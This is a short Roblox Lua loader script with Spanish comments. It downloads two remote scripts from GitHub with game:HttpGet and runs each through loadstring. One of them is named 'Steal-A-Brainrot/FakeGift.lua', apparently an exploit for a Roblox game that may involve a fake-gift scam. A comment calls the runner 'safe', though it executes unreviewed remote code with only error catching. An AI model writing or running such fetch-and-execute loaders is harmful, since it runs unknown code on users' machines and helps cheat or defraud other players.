-- URLs
local url1 = "https://raw.githubusercontent.com/lynox-67/pueda-/refs/heads/main/lua"
local url2 = "https://raw.githubusercontent.com/platinww/CrustyMain/refs/heads/main/Steal-A-Brainrot/FakeGift.lua"

-- Función segura para ejecutar scripts
local function runScript(url)
    local success, result = pcall(function()
        local content = game:HttpGet(url)
        local func = loadstring(content)
        if func then
            return func()
        end
    end)

    if not success then
        warn("Error ejecutando: " .. url)
    end

    return success
end

-- Ejecutar primero
local ok = runScript(url1)

-- Espera (ajústala si quieres)
task.wait(3)

-- Ejecutar segundo
if ok then
    runScript(url2)
end
